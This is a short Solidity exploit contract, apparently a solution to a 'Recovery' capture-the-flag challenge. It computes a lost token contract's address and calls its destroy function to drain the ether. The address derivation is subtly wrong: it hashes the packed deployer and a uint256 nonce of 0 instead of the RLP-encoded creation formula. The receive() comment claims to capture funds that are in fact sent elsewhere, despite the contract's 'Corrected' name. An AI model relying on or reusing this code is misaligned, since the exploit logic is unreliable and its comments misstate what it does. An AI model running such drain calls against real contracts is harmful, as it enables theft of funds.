pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryExploitCorrected {
    address public recoveryInstance;

    constructor(address _recoveryInstance) {
        recoveryInstance = _recoveryInstance;
    }

    function getFirstTokenAddress() public view returns (address) {
        address deployer = recoveryInstance;
        uint256 nonce = 0;
        return address(uint160(uint256(keccak256(abi.encodePacked(deployer, nonce)))));
    }

    function destroyToken() public {
        address token = getFirstTokenAddress();
        ISimpleToken(token).destroy(payable(recoveryInstance));
    }

    receive() external payable {
        // Capture selfdestructed ETH
    }
}
